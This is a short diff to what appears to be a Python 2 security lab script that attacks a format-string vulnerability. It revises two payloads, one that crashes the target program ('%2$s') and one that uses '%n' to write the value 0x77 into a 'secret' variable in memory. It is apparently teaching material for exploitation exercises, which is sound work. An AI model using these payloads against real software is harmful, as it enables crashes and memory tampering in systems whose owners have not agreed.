@@ -93,7 +93,7 @@ print
 print "---------------------------------------------------------------------"
 print "Part 1a) Crash the program"
 p, _, _ = run(0, False)
-inject("%x%s")
+inject("%2$s")
 p.close()
 print "Program exits with signal: " + str(p.signalstatus) + " (" + SIGNALS_TO_NAMES_DICT[p.signalstatus] + ")"
 print
@@ -128,7 +128,7 @@ print "---------------------------------------------------------------------"
 write_val = 0x77
 print "Part 1c/d) Write a value (" + '0x{:02x}'.format(write_val) + ") to secret[1]"
 p, secret0_addr, secret1_addr = run(-1, 4)
-inject("%" + str(sii) + "$" + str(write_val) + ".0s%" + str(sii) + "$n")
+inject("%" + str(write_val) + ".0s%" + str(sii) + "$n")
 read_and_print(p) #payload result
 read_and_print(p) #payload result
 read_and_print(p) #payload result
